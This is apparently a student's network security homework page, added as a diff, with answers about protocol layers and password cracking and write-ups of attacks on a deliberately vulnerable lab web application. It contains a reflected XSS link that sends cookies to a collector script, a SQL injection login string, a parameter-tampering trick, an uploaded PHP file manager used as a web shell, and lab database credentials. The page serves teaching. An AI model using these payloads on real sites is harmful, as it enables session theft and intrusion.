@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1 plus MathML 2.0//EN" "http://www.w3.org/TR/MathML2/dtd/xhtml-math11-f.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:html="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <title>CS-285 Homework #5</title>
+    <link rel="stylesheet" type="text/css" href=".../style/assignment.css" />
+    <style type="text/css">
+    </style>
+    <script type="text/javascript"> 
+      var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+      document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+      </script> 
+    <script type="text/javascript"> 
+      var pageTracker = _gat._getTracker("UA-939849-1");
+      pageTracker._initData();
+      pageTracker._trackPageview();
+    </script>
+  </head>
+  <body>
+    <div id="header">
+      <h1>CS-285: Network Security</h1>
+      <h2>Homework #5</h2>
+      <h2><a href="http://himinbi.org/">Will Holcomb</a></h2>
+      <h2>Due: 13:10 9 December 2010</h2>
+    </div>
+    <ol>
+      <li>
+	<ol>
+	  <li>SSL &mdash; Transport Layer</li>
+	  <li>PGP &mdash; Application Layer</li>
+	  <li>IPsec &mdash; Network Layer</li>
+	  <li>WPA &mdash; Link Layer</li>
+	  <li>HTTPS &mdash; Transport Layer</li>
+	  <li>HTTP Auth &mdash; Application Layer</li>
+	</ol>
+      </li>
+      <li>
+	<ol>
+	  <li>SSL &mdash; Secure Sockets Layer provides confidentiality by using symmetric cryptography.</li>
+	  <li>PGP &mdash; Pretty Good Privacy provides confidentiality using the symmetric ciphers. To distribute the secret key used in the symmetric cipher, it encrypts the secret key using the receiver's public key.</li>
+	  <li>IPsec &mdash; IP Security provides confidentiality and source authentication by creating a symmetrically encrypted tunnel between two networks.</li>
+	  <li>WPA &mdash; Wi-Fi Protected Access provides confidentiality and source authentication by creating a symmetric tunnel between a wireless acess point and client.</li>
+	  <li>HTTPS &mdash; Secure Hypertext Transfer Protocol provides confidentiality and source authentication using symmetric key cryptography where keys are trusted via a certificate authority.</li>
+	  <li>HTTP Auth &mdash; Hypertext Transfer Protocol Authentication protects web resources by providing a method of authenticating access.</li>
+	</ol>
+      </li>
+      <li>
+	<ol>
+	  <li>A four letter password has 26<sup>4</sup> possible combinations. The password will likely be cracked halfway through those, so at a rate of checking one password per second, it will take 456976 / 2 = 228488 seconds &approx; 63.5 hours to crack.</li>
+	  <li>If the cracker is able to tell when each individual is correct of incorrect, then each position need only be tried once for a maximum of 26 tests. The password is expected to be found halfway through, so it should be cracked after 13 seconds.</li>
+	</ol>
+      </li>
+      <li>
+	<ol>
+          <li>The cookie for the site has the name PSESSID with the value crv7nbq6bi9nu8o2rr0usi1i60.</li>
+          <li>An attack link to send the user's cookie is <a href="http://129.59.89.23/pictures/search.php?query=%3Cscript%20type='text/javascript'%3Edocument.location='http://129.59.89.23/badguy.php?addr=will@dhappy.org%26ssid='%2Bescape(document.cookie)%3C/script%3E">http://129.59.89.23/pictures/search.php?query=%3Cscript%20type='text/javascript'%3Edocument.location='http://129.59.89.23/badguy.php?addr=will@dhappy.org%26ssid='%2Bescape(document.cookie)%3C/script%3E</a></li>
+	</ol>
+      </li>
+      <li>A stored cross-site scripting attack has been stored to <a href="http://129.59.89.23/guestbook.php">http://129.59.89.23/guestbook.php</a>.</li>
+      <li>
+        <p>To login using a SQL injection, one can use the username <code>cs285web' or ''='</code> with any password on the page <a href="http://129.59.89.23/users/login.php">http://129.59.89.23/users/login.php</a>. The secret information is:</p>
+        <ul>
+          <li>The birthdate is 08/15/1989.</li>
+          <li>The SSN number is: 666-77-8888</li>
+        </ul>
+      </li>
+      <li>
+        <p>The copyright key for monkey is 1639434. This is retrieved by going to the url <a href="http://129.59.89.23/pictures/highquality.php?picid=43&amp;key=highquality">http://129.59.89.23/pictures/highquality.php?picid=43&amp;key=highquality</a>. This was found by buying an image and then changing the picid.</p>
+      </li>
+      <li>
+        <ol>
+          <li>The first attack was to upload <a href="http://phpfm.sourceforge.net">PHP File Manager</a> as an image file. It is available at: <a href="http://129.59.89.23/upload/test/test.php">http://129.59.89.23/upload/test/test.php</a></li>
+          <li>
+            <p>Tracing the inclusions from the file, the database authentication information is:</p>
+            <ul>
+              <li>Username: wackopicko</li>
+              <li>Password: webvuln!@#</li>
+            </ul>
+          </li>
+          <li>
+            <p>One obvious attack is to get tradebux. This is accomplished with the script added to <a href="http://129.59.89.23/upload/give_wholcomb_bux.php">http://129.59.89.23/upload/give_wholcomb_bux.php</a>. Loading the file gives <code>$user</code> 1000000 bux.</p>
+          </li>
+        </ol>
+      </li>
+    </ol>
+  </body>
+</html>
